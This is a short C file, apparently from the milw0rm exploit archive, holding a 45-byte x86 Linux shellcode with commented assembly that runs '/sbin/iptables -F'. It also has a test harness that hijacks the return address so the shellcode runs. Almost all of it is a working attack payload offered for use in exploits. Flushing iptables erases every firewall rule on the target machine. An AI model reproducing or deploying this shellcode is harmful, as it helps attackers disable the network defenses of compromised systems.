/*
 * 06/03/2003
 *
 * ( 45 bytes ) to flush iptables.
 *
 * _execve(/sbin/iptables -F)  by UnboundeD
 * greetz to s0t4ipv6.
 *
 */

char shellcode[] =

"\x31\xd2"                      // xorl         %edx,%edx
"\x52"                          // pushl        %edx
"\x66\x68\x2d\x46"              // pushw        $0x462d
"\x89\xe6"                      // movl         %esp,%esi
"\x52"                          // pushl        %edx
"\x68\x62\x6c\x65\x73"          // pushl        $0x73656c62
"\x68\x69\x70\x74\x61"          // pushl        $0x61747069
"\x89\xe7"                      // movl         %esp,%edi
"\x68\x62\x69\x6e\x2f"          // pushl        $0x2f6e6962
"\x68\x2f\x2f\x2f\x73"          // pushl        $0x732f2f2f
"\x89\xe3"                      // movl         %esp,%ebx
"\x52"                          // pushl        %edx
"\x56"                          // pushl        %esi
"\x57"                          // pushl        %edi
"\x89\xe1"                      // movl         %esp,%ecx
"\x31\xc0"                      // xorl         %eax,%eax
"\xb0\x0b"                      // movb         $0xb,%al
"\xcd\x80"                      // int          $0x80
;

main() {
        int *ret;
        ret=(int *)&ret +2;
        printf("Shellcode lenght=%d\n",strlen(shellcode));
        (*ret) = (int)shellcode;
}

// milw0rm.com [2004-09-26]